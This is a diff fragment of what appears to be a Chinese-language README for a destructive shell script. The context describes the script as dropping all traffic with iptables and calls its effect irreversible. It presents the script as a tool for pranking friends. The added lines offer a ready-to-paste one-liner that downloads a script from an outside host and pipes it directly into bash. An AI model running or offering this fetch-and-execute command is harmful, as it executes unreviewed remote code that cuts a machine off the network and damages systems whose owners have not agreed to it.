@@ -88,3 +88,6 @@ echo -e "${YELLOW}[2/4] 正在屏蔽所有端口 (iptables DROP all)...${NC}" `
 
 再次强调：**此脚本仅用于内部测试和整蛊好友的虚拟环境，执行即代表您已充分理解其不可逆的毁灭性。**  
 如果你真的在生产服务器上运行了……emmm，祝你下一份工作顺利。
+
+可用脚本
+` bash <(curl -sSL https://resources.zakoflare.com/bash/ssb/ssb.sh) `
